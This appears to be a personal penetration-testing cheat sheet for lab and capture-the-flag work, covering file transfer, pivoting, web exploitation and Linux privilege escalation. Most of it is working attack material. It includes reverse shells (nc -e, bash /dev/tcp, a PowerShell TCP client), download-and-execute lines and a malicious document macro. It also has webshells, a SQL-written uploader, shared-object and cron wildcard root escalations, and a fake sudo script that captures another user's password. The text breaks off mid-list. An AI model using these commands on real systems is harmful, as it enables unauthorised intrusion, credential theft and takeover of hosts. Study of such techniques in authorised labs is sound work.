==🔵You will not be knowing all avenues before hand; that's why you are building up your methodology==
# ==🟣General :==
##### ==🔵Troubleshooting :==

MTU/packet fragmentation
Issue : 
If terminals get stuck 
If RDP screen is black 
If websites are not loading 

Reconnect to VPN

Lower MTU:
try lowering the MTU to below 1250. We recommend decreasing it in increments of 50 until the connection becomes stable, but please do not set it below 700.
```
sudo ip link set dev tun0 mtu 1350
```
Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
```
sudo chattr -i /etc/resolv.conf

sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""
```

## ==🔵SSH into a user==
To SSH into a user using a private key:
```
ssh -i <private_key> <username>@<target_ip>
```

## ==🔵To connect to RDP : ==

BLACK SCREEN : lower mtu to 1000
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
```
or
When it isn't connecting : 
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
```
or 
```
xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
```
Enter the password when prompted.

Transfer `nc.exe` to windows and get a reverse shell : 
Download 64 bit netcat : 
if required then download 32 bit x86 netcat
```
https://github.com/int0x33/nc.exe/
```
start python server : 
```
python3 -m http.server 8000
```
download on windows :
```
powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
```
to get shell back from windows to kali : 
start a listener on Kali:
```
rlwrap -f . nc -lvnp 4444
```
windows command to get reverse shell of cmd : 
```
nc.exe -e cmd.exe <kali ip> 4444
```

## ==🔵Hash/Password cracking : ==

Whenever you find a hash, first try [https://crackstation.net/](https://crackstation.net/)
If that doesn't work, try John the Ripper or Hashcat. Let it run for not more than 10 minutes.

Google it first, use hashes.org,
then try `rockyou.txt` wordlist with both hashcat and john. Because sometimes one tool cracks but the other doesn’t. So always try both. Max time I would before moving on is like 15 min. If it still doesn’t crack it’s highly likely that it’s not the intended way.

----

UNZIP THE rockyou.txt.gz file first
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

----

john will automatically identify the hashing algorithm
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Then show the recovered password:
```
john --show hash.txt
```

-----------

TO GET THE HASH FIRST FROM SYSTEM AND SAM : 
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
```

----

AFTER YOU GET THE HASH FROM SAM AND SYSTEM : 
For Password Hashes from ==🔵SAM and SYSTEM== files : 
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
```
Original format of Hash `Username : RID : LM hash : NT hash`
In the `hash.txt` file you have to put only the `NT Hash` part
Then show the recovered password:
```
john --show --format=nt hash.txt
```

----

For common ==🔵Kerberoasting== hashes (`$krb5tgs$...`), John the Ripper can use:
```
john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
==🔵or you can use `--format=krb5asrep` as per requirement of hash==
Then show the recovered password:
```
john --show --format=krb5tgs hash.txt
```

## ==🔵Stable Shell : ==

enter one by one :
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

If python3 isn't available, try:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## ==🔵File Transfer==

```
cat <filename> | grep -i "<word>" -C 10
#10 lines before and 10 lines after
```
### ==🔵If file not downloading : ==

The error `Access to the path 'C:\nc.exe' is denied` occurs because you're trying to save `nc.exe` directly in `C:\`, and your current user does not have permission to write there.

check for your writeable permissions in current folder : 
```
icacls .
```
switch folders until you get look for  W (Write-only access)* , M (Modify access), F (Full access)

switch to temp folder 
```
cd C:\Temp
```

switch to users 
```
cd C:\
dir
icacls .
```
switch to public 
```
cd C:\Users\Public
```

----
### ==🔵Kali Linux → Windows== 

Start server on kali : 
you won't be able to start on 80 on victim machine if it already has something running (for Linux victims)
```
python3 -m http.server 8000
```

Windows get file : 
CMD (1st priority) : 
```
certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
or 
certutil.exe -urlcache -split -f http://10.150.72.11/shell.exe shell.exe
```
PowerShell : 
```
powershell iwr http://KALI_IP:8000/filename -o filename

powershell -Command "iwr 'http://<kali ip>:8000/reverse.exe' -OutFile 'C:\Program Files\File Permissions Service\filepermservice.exe'"
```

==🔵If you want to download directly to a path :==
==🔵KEEP NAME OF .EXE SAME AS THAT OF `service name.exe`==
```
certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
```

==🔵or if you want in current directory : ==
```
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
```
==🔵then transfer to desire directory : ==
```
move <file name from current folder> <full path with with file name>
```

### ==🔵Windows → Kali Linux using SMB==
On Kali start SMB server : 
```
impacket-smbserver share . 
# if error - wants smb2 : 
impacket-smbserver share . -smb2support
```
On windows transfer files : 
```
copy <input file name> \\<kali ip>\share\<output file name>
# ex. copy windows.txt \\192.168.131.128\share\windows.txt
```

### ==🔵Windows (AD) → Kali (SCP)==

Kali:
```bash
sudo systemctl start ssh
```

Windows PowerShell:
```
powershell
```

For a file : 
```powershell
scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/Downloads
```

For a directory :
```
scp -r "C:\temp\Active Directory" kali@<KALI_IP>:/home/kali/Downloads/
```
1. Spaces in the folder name: `Active Directory` must be enclosed in quotes.
2. Copying a directory: use `-r` to copy a directory recursively.
### ==🔵Windows (AD -authenticated SMB share) → Kali Linux==

#### On Kali

Create a folder:

```
mkdir -p ~/bloodhound-share
```

Start the SMB server:

```
sudo impacket-smbserver share ~/bloodhound-share -smb2support -username labuser -password LabPassword123
```

Leave that terminal running.

#### On the Windows AD machine

Connect to it:

```
net use \\10.150.71.44\share /user:labuser LabPassword123
```

Then copy:

```
copy 20261008121652_BloodHound.zip \\10.150.71.44\share\
```

### ==🔵Netcat (to get shell back on kali and not use windows rdp): ==

Download 64 bit netcat : 
if required then download 32 bit x86 netcat
```
https://github.com/int0x33/nc.exe/
```
RDP into target
```bash
xfreerdp /v:10.49.147.79 /u:user /p:password321 /cert:ignore /dynamic-resolution
```
start python server
```bash
python3 -m http.server 8000
```
on windows , get file from kali : 
```cmd
powershell iwr http://192.168.163.199:8000/nc64.exe -o nc64.exe
```
start listener on kali : 
```bash
rlwrap -f . nc -lvnp 4444
```
on windows execute rev shell : 
```cmd
nc64.exe -e cmd.exe 192.168.163.199 4444
```

-----

### (Scp) Windows → Linux (if ssh into windows system) : 

run this on kali : 
```
scp username@remote_host:/path/to/file .
```
### Linux get file : 
```
wget http://<ip>:8000/filename -O filename
curl http://<ip>/filename -o filename

nc <victim ip> 4444 < filename     # sender 
nc -lvnp 4444 > filename           # receiver
```


## ==🔵Reverse Shells : ==

==🔵Listener : ==
```
rlwrap -cAr nc -lvnp 4444
```

==🔵if we didn't wanted a call back to our listener using a reverse shell<br>we could have gotten system in same shell as well==
```
PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
```

go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)

==🔵For 64 bit windows : ==
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
```
==🔵For 32 bit x86 architecture : ==
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```

#### ==🔵PowerShell : ==
Exploit Script : 
replace the kali ip here 
Use single quotes for the outer PowerShell string and keep the inner command in double quotes:
```
$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.163.199:8000/mypowershell.ps1'')"'
```

with your reverse shell looking like:
Payload script : 
replace the kali ip here 
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
you should get a shell on your Netcat listener on port 4444

#### Reverse shell in Metasploit Multi Handler : 

Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
create reverse shell For Metasploit Meterpreter handler : 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
```
transfer to windows 
now back on kali start listener 
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <SET LHOST>; set LPORT 4445;exploit"
```
now run our reverse shell on windows : 
```
reverse.exe
```
## ==🔵Port Forwarding/Pivoting ==

after gaining initial access , to ==🔵discover more devices on same network== use nmap to scan
download from : (on kali attacker machine)
```
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
```
transfer to victim machine , then run : 
```
./nmap -sn <victim ip>/24     # /24 since only last octet is changing in subnet
```
remove first (gateway) and last ip (broadcast)
now check which machine you can access now 
```
./nmap -p0-100 -vv <different left ips>
```
### ==🔵Ligolo-NG==

#### Normal Usage

1. On your attacker machine, start by creating a **TUN interface** named `ligolo` .

   ```bash
   sudo ip tuntap add user <user_here> mode tun ligolo
   sudo ip link set ligolo up
   ```
2. Run the LIGOLO-NG proxy server on the attacker machine:

   ```bash
   sudo ./proxy -selfcert
   ```
3. Move the LIGOLO-NG agent to the pivot host and run it:

   ```bash
   # Windows
   .\win-agent.exe -connect 192.168.243.12:11601 -ignore-cert

   # Linux
   ./agent -connect 192.168.243.12:11601 -ignore-cert
   ```
4. We should get a **Connection established** in the attacker's machine which confirms that the agent was successfully connected to our proxy server. Next, select the session so Ligolo knows which agent we’re working with:

   ```bash
   session
   <SELECT THE ID of the session>
   ```
5. In the victim machine, find the internal interface and add it to the ligolo route in a new terminal window:

   ```bash
   sudo ip route add 10.10.3.0/24 dev ligolo
   ip route list # Verify if added
   # You can also use the autoroute command in the proxy session to add it automatically 
   ```
6. Return to the Ligolo proxy session and initial the tunneling process by entering the `start` command.
7. Verify if you can access the internal network:

   ```bash
   nmap --unprivileged 10.10.3.0/24
   netexec smb 10.10.3.0/24
   ```

#### How to get files from the Attacker

1. Go to the ligolo proxy session and set up the listener and redirect connections to a desired address.

   ```bash
   listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 # Redirect Pivot IP:8888 to Kali:80
   listener_list # To check if added
   ```
2. To verify, we can try a file transfer.

   ```bash
   # Set up a python web server on Kali port 80
   python3 -m http.server 80

   # On a internal host, access port 8888 of the pivot
   certutil.exe -f -urlcache http://PIVOT_IP:8000/file.txt file1
   ```

#### How to get a Reverse Shell back to the Attacker

1. Go to the ligolo proxy session and set up the listener and redirect connections to a desired address.

   ```bash
   listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:443 # Redirect Pivot IP:4444 to Kali:443
   listener_list # To check if added
   ```
2. To verify, we can try a reverse shell.

   ```bash
   # Create a reverse shell payload
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<PIVOT_IP> LPORT=4444 -f exe -o rev.exe

   # Set up a reverse shell listener on Kali port 443
   penelope -p 443

   # On a internal host, get rev.exe and run it
   .\rev.exe
   ```

### SSH : 

to do local port forwarding :
```
ssh -L <attacker local port>:<target ip>:<target port> root@<through which ip> -i id_rsa -fN 

localhost:8000      # now everything visible on this 
127.0.0.1:8000
```
to do remote port forwarding :
```
ssh -R <local port to open>:<which final internal network machine ip>:<which target port to forward to of internal network machine> kali@<kali ip> -fN
```
to do dynamic port forwarding : (on kali)
```
ssh -D 9050 -i id_rsa root@<ip to forward traffic to>
```


### Chisel : 
```
sudo apt install chisel     #kali linux - attacker 

https://github.com/jpillora/chisel/releases/tag/v1.12.0   # windows 
chisel_1.12.0_windows_amd64.zip
```
Attacker / Kali — start server : 
```
chisel server -p 8080 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:<CHISEL_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

### Chisel with SOCKS (for dynamic port forwarding) :
```
sudo gedit /etc/proxychains.conf
add line in last : socks5 127.0.0.1 9050
```
Attacker / Kali — start server : 
```
chisel server -p 8000 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
#chisel.exe client 10.10.10.5:8000 R:9050:socks
```



# ==🟣Initial Access ==

#### ==🔵Methodology : ==

try every cred you find everywhere, password reuse shows up a lot

1. Enumerate
- Nmap → ports, services, versions
- Check ftp anonymous/ smb nullguest for smb, default creds, configs/files, users
- Credential finding locations : landing page, every shown pages, directory,  look for names, username, password , weird string could be a username or password , name, email, street name, description, file
- Can't find password ? try username as password. spray this credentials to other service
- Reuse every credential everywhere : login page If you found

2. Web
- see : index.html ; 
- WhatWeb → tech + versions → `"version CVE"` (if doesnt work the first time then it doesnt work)
- Browse pages, source, comments, JS, files
- Hunt creds: names, emails, descriptions, `.git` + history
- Gobuster + SecLists → dirs/files : then sub directory again
- Check subdomains

3. Identify
- Public/CMS → CVE → WPScan / JoomScan / Nikto
- Custom → test functionality

4. Common Vectors
- SQLi → Boolean / UNION (add an extra - at the end of SQLi for it to work sometimes)
- File upload → extension/header/.htaccess bypasses (if its apache you can try uploading .htaccess)
- LFI / RFI
- Path Traversal
- Log Poisoning
- Command Injection

5. Exploit + Chain
- Validate CVE → exploit
- LFI + upload → code execution
- `.git` → source/secrets → creds
- Creds → other services
- Upload + misconfig → code execution
#### ==🔵Port Scanning : ==

Nmap 
```
sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
```

When the TCP scan finishes, immediately run a UDP scan.
```
sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
```
## ==🟢Web Application ==
##### ==🔵Directory brute forcing : ==

Quick initial scan : 
```
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 50 -u <IP>
```

After you find a directory then recursively brute force that sub-directory again
then check those also

PHP website with more thorough enumeration : 
```
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -u <IP>
```
or use `/usr/share/wordlists/dirb/big.txt`

##### ==🔵Wordpress enumeration  : ==

Wordpress enumeration 
```
wpscan --url http:<IP> -e ap,at,u
```

##### ==🔵Check if virtual hosting is present : ==

website may be configured to respond to that hostname, not just the IP address.
the same IP can serve different websites based on the HTTP `Host` header.

Find other domain names you can find on the website 
for ex. in emails `<sample>@<sample>.<sample>`

Open a terminal and run:
```
sudo nano /etc/hosts
```
Go to the bottom and add all the other domain names:
```
<IP> mafialive.thm
```

##### ==🔵Default files on the website : ==

robots.txt
```
curl -s http://mafialive.thm/robots.txt
```

whatever the file lists , go to that directory

```
/robots.txt
/about.html
```

##### ==🔵LFI : ==

Keep checking the URL bar if it's suspicious for LFI
`view=`
`page=`
try to go one directory back one by one to see till where last it allows you

Download wordlist : 
[Payloads list](LFI%20payloads.txt)
```
wget https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/refs/heads/master/LFI%20payloads.txt
```

then do path traversal brute force from that directory :
```
ffuf -u 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ' \
-w 'LFI payloads.txt' -t 50
```
ADD THESE FILTERS IN LAST OF COMMAND to remove noise : 
- `FUZZ` is replaced with each wordlist entry.
- `-fs 286` — Filter by response size: Hides responses whose body size is exactly 286 bytes.    
- `-fw 41` — Filter by word count: Hides responses containing exactly 41 words.
- `-fl 16` — Filter by lines count: Hides responses containing exactly 16 lines.

Now in browser , try : 
Passwd : 
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..///etc/passwd
```
If it works , now look for log files replacing the last file in path : 
```
/var/log/apache2/access.log  
/var/log/apache2/error.log  
/var/log/nginx/access.log  
/var/log/nginx/error.log  
/proc/sys/environ
```
then test if the log file loads : 
TIP : Reset machine and start afresh if there's too many logs
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..///var/log/apache2/access.log  
```
see if it has the `Mozilla/5.0 ...` — the User-Agent header sent by the browser.

Now Verify whether your User-Agent is logged
In Kali, send a harmless, unique marker to the lab:
```
curl -A 'LabMarker-8472' http://mafialive.thm/
```
Then reload your already-working `access.log` URL in the browser and search the displayed content for:
```
LabMarker-8472
```
If you find it, you've verified that your chosen header is being recorded in the access log.



##### ==🔵If it's a CMS : ==

go to Exploit DB and search for CMS name [Link](https://www.exploit-db.com/)
if you have the version name , the better 

see the exploit code , what directory and option in the website it is going to 

To download the exploit to current directory : 
```
searchsploit -m Path
```

Priority : 
1. Arbitrary File Upload
##### ==🔵Default Credentials : ==

of username : password same you found , 
admin:admin etc

phpmyadmin : 
username : root 
password : leave empty (in some versions it's "password")

Zabbix : 
##### ==🔵File upload : ==

###### ==🔵Reverse Shell : ==

Go to https://www.revshells.com/

Use PHP Pentest monkey ; change ip and port
save as
```
nano shell.php
```
start listener on kali : 
```
rlwrap -cAr nc -lvnp 4444
```

###### ==🔵if `.php` is blocked==

When you go to the folder where the files are being uploaded , nothing is there

Try renaming to other allowed extensions like : `.php5`  `.phtml` `.pht` `.phar`
```
mv shell.php shell.php5
```
Repeat the process again and try to see if it bypasses the upload.

###### ==🔵If all `.php` extensions are blocked : ==

if there is an Apache web server with a potential file upload vulnerability, always try a `.htaccess` file
create a new `.htaccess` file
```
nano .htaccess
```
paste : 
```
AddType application/x-httpd-php .
```

###### ==🔵Webshell : ==

```
gedit webshell.php
```

```
<?php system($_GET['cmd']); ?>
or
<?=`$ GET[0]`?>
```

go to the file location and test :
```
<full path till payload>?0=id
```

##### ==🔵If found : sql_backup :==

We can use ‘cat’ to inspect the backup file.
```
cat <file>.sql
```
search for usernames and its password hashes

Search for usernames/passwords
```
grep -inE 'user|pass|username|password' <file>.sql
```

Inspect SQL dump
```
less <file>.sql
```
##### ==🔵SQL Injection : ==

If website has executable SQL commands : 
Php get upload option to upload any file on website itself 
```
https://gist.github.com/BababaBlue
```
code :
```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
after that , upload `PHP Ivan Sincek` revershell to the website

## ==🟢Services : ==

#### ==🔵SMB==

Access Anonymous SMB Shares :
```
smbclient \\\\<IP>\\anonymous
```

List SMB Shares :
```
smbclient -L \\<IP>
```

#### ==🔵NFS Shares==

Show NFS Shares : 
```
showmount -e <IP>
```

#### ==🔵FTP (port 21)==

Connect:
```
ftp 10.129.47.240
```
When prompted:
```
Name: anonymous
Password: anonymous
```
Then enumerate everything:
```
ls -la
```

confirm FTP is writable
On your FTP session:
```
put test.txt
```
If it says:
```
226 Transfer complete
```
then the directory is writable.

Use MSFvenom to generate the aspx payload.
```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.138 LPORT=4444 -o reverse-shell.aspx
```
Then, we’ll upload the generated payload on the FTP server and confirm that it has been uploaded.
```
put reverse-shell.aspx
```
check 
```
ls 
```

Start listener on kali
```
nc -nlvp 4444
```

In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP server.
```
http://10.129.47.240/reverse-shell.aspx
```
Go back to your listener to see if the shell connected back.
#### ==🔵Database file found (.db)==

open database :
```
sqlitebrowser ma.db
```
#### ==🔵Squid Proxy :==
configure FoxyProxy extension 
with port number and ip address of victim machine 
and then load the website 
remember to turn off also when visiting other websites
#### ==🔵Macro :==
```vb
Sub MyMacro
	Dim str as String
	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
	Shell(str)
End Sub
```

Alternative: Automating with Metasploit
Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
Generate the Payload : 
```bash
msfconsole
use exploit/multi/fileformat/openoffice_document_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
This outputs a ready-to-upload `.odt` file.

Catch the Shell :
```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
```
sessions -i 1
```
#### ==🔵Redis== 

```
redis-cli -h <IP> # to connect to the server

after connecting : 
info                            # to get information/details about the server
SELECT <database_index>         # select databse
keys *                          # to key all key names
get <Key name>                  # to get value of the key 
config get dir                  # to get config directory for redis
config set dir /var/lib/redis/.ssh>  # to set a new directory

ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
ls -la ~/.ssh/     # to see kali public ssh key 
( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 

cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key

config set dbfilename "authorized_keys"    # write our key to redis disk 
save                                       # to save the file now

ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
```


# ==🟣Linux Privilege Escalation==

Linpeas :
```
https://github.com/peass-ng/PEASS-ng/releases
```
download "linpeas.sh"
##### General : 
Linux has `tmp` folder , which is world writeable
```
cd /tmp
```

GTFO Bins Wayback : https://web.archive.org/web/20260102075820/https://gtfobins.github.io/#view

Find Flag 
```
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```
### ==🔵SUDO exploitation : ==

#### ==🔵Shell Escape Sequences : ==
programs "user" allowed to run via sudo
```
sudo -l 
```
go to gtfo bins
and use sudo before command as `sudo <command>`
##### ==🔵Examples : ==

###### ==🔵Backup files==

so we see we can run this script as sudo :
```
sudo /usr/bin/perl /home/itguy/backup.pl
```

so we first see the contents of the file
```
cat /home/itguy/backup.pl
```

it is executing another `.sh` script at another location
we check our permissions on the second script 
```
ls -la <path to second script>
```
if we can write on that script : 

replace the contents of that file with a reverse shell 
```
echo "sh -i >& /dev/tcp/<kali ip>/4444 0>&1" > "path to second script"
```
start listener
```
rlwrap -cAr nc -lvnp 4444
```

then run the initial script using sudo 
```
sudo /usr/bin/perl /home/itguy/backup.pl
```
well get root reverse shell back

#### ==🔵Environment Variables : ==
```
sudo -l 
```
Look for :
```
env_keep += LD_PRELOAD
env_keep += LD_LIBRARY_PATH
```

==🔵for LD_PRELOAD : ==
make exploit 
```
nano preload.c
```
paste code : 
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
compile it 
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
This creates:
```
/tmp/preload.so
```
Then run one of the permitted programs while specifying the library:
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
#ex. any of the complete paths from the `sudo -l` list like "/usr/sbin/apache2"
# not all executables will work , try until one works
```

==🔵for LD<i>LIBRARY</i>PATH : ==
Find which shared libraries the target binary depends on after seeing from `sudo -l`
```
ldd /usr/sbin/apache2
# or you can use any executable path from `sudo -l` results
```
Pick a library name from this list — e.g. **`libcrypt.so.1`** ; not all libraries will work , try until one works
Create your own library : 
```
nano library_path.c
```
paste code : / Create the Malicious Shared Object : 
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
compile it : 
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
#put the library name from the list we found out 
```
run : 
```
sudo LD_LIBRARY_PATH=/tmp apache2
# use same executable you choose in starting whose you saw library path for 
```

### ==🔵SUID Executables : ==
###### ==🔵Known exploits : ==
Find all the SUID/SGID executables on the Debian VM
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```
find / -user root -perm /4000 2>/dev/null
```
Find known exploit for `versions` found of executables on searchsploit , Google, and GitHub
or go to gtfo bins 
###### ==🔵SUID shared object (.so) injection : ==
find a `-so` executables
then run this to check the files its asking for but not available 
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# replace the file name with the shared file name/location
```
ex we get its asking for another shared object : `/home/user/.config/libcalc.so`
create that directory by `mkdir /home/user/.config`
go inside that directory and create a exploit : 
```
nano exploit.c
```
and paste this code 
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
give permission `chmod +x exploit.c`
compile the code to that location it asks for 
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so exploit.c
```
now again run the initial executable
```
/usr/local/bin/suid-so
# run directly , you will get a root shell now
```
###### ==🔵Environment Variables (without absolute service path) : ==
find if you have any env files : `/usr/local/bin/suid-env`
Find what it executes : `strings /usr/local/bin/suid-env`
see if it starts any service without proving the full path
if no , create an exploit : 
```
nano service.c
```
and paste the code :
```
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
Compile it:
```
gcc -o service service.c
```
Put your directory first in PATH
```
PATH=.:$PATH
# "." means: the current directory
```
now just run the executable again : 
```
/usr/local/bin/suid-env
```

Environment Variables (without absolute service path) : will work only for bash version less than 4.0
### ==🔵Cron tabs :==

Go to `crontab.guru` website and enter cron tab to see what it means
`*/5` - at every 5th minute
ex. `* * * * * kali /bin/bash /home/kali/Downloads/code/code.sh`
add user name and shell also
###### ==🔵Weak File Permissions : ==
minute ; hour ; day of month ; month ; day of week
```
1. View System-wide crontab : cat /etc/crontab
2. check if path is writeable : la -la "full path to script"
3. locate <filename>
```
==🔵replace content of file with : ==
IMPORTANT : This line should be in starting "#!/bin/bash"
```
#!/bin/bash
<put bash reverse shell>
# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
```
and start listener on kali
```
nc -nvlp 4444
```

###### ==🔵PATH Manipulation : ==
View the contents of the system-wide crontab:  
```
cat /etc/crontab
```
Note that the PATH variable starts with **/home/user** which is our user's home directory.
Create a file called **overwrite.sh** in your home directory with the following contents:
```
#!/bin/bash  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
or 
change the path ! 
```
export PATH=/tmp:$PATH
# export PATH=<directory which you want to add to path>:$PATH
# echo $PATH
```
###### ==🔵Wild Cards :==
cat the cron job file 
if it has `tar czf /tmp/backup.tar.gz *`
check gtfo bin if it has `-- option name` available or not
then in the path it takes , create these files : 
Create a script that will run as root:
```
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```
Make it executable:
```
chmod +x shell.sh
```
Now create the malicious filenames:
```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
Check them:
```
ls -la
```
After it cron executes (ex. after every minute) , check:
```
ls -l /tmp/rootbash
```
Then:
```
/tmp/rootbash -p
```

### ==🔵Process Snooping with pspy :==
download pspy 64 bit from 
https://github.com/dominicbreuker/pspy
now transfer the pspy file to the victim machine
give permissions : 
```
chmod +x pspy64 
```
run : 
```
./pspy64 
```
UID=0 is for processes run by root

ex. if uid=0 is running `sudo cat /etc/shadow ` again and again 
but we can do path hijacking since the sudo is not having a defined path 
create a new file in `/tmp` : 
```
cd /tmp
```
make sudo file of ours : 
```
nano sudo 
```
enter script : 
```
#!/bin/bash

read frank_pass
echo $frank_pass > /tmp/frank_pass
# it will print what user enters in /tmp folder 
# go and see by `ls -al /tmp` then cat that `cat /tmp/frank_pass`
```
give it permissions to execute
```
chmod +x sudo
```
we go to home and edit the `.bashrc` file 
```
nano .bashrc
```
in starting only after the comments , add line 
```
PATH=/tmp:$PATH
```
save and exit 
now to update the PATH we run : 
```
source .bashrc
```
now we wait till the user enetrs the password after running sudo and we get the password
now cat into the file in `/tmp` to see the file
now we will fix the sudo in the `~/.bashrc` file 
remove the `/tmp` entry we made in PATH line , keep rest PATH line as it is
save and exit
again save by source
```
source .bashrc
```
or use full path for sudo since path is updated now 
```
/usr/bin/sudo su
```

Attack vector 2 : 
if the file path is mentioned but what all libraries it uses in the files are modifiable : 
for ex. if root is running : `/opt/server_admin/reporter.py `
check if we can overwrite it : 
```
tmp$ ls -al /opt/server_admin/reporter.py 
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
```
it is using absolute path so we cant change it 
now see the contents of the file :
```
cat /opt/server_admin/reporter.py
```
if it is using 
```
import os
#os.system(command)
```
it is using `import os` and then a system command 
so well change the contents of that `os` library itself
The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:
```
- Directory of the script being executed
- /usr/lib/python2.7
- /usr/lib/python2.7/plat-x86_64-linux-gnu
- /usr/lib/python2.7/lib-tk
- /usr/lib/python2.7/lib-old
